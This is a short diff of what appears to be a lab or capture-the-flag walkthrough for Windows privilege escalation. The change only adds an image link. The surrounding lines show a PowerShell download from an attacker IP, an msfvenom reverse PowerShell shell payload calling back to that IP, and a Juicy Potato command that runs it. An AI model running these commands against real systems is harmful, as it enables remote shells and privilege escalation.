@@ -76,6 +76,10 @@ powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.14.45:8080/
 msfvenom -p cmd/windows/reverse_powershell lhost=10.10.14.45 lport=9999 -f raw > shell.bat
 ```
 Transfer shell.bat using the same HTTP server and PowerShell download method.
+
+![image](https://github.com/user-attachments/assets/cbeb88e1-dd45-471a-bb34-63943d035411)
+
+
 **Execute Juicy Potato**
 ```bash
 C:\Tools\jp.exe -l 53375 -p C:\Windows\System32\cmd.exe -a "/c C:\Tools\shell.bat" -t * -c "{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}"
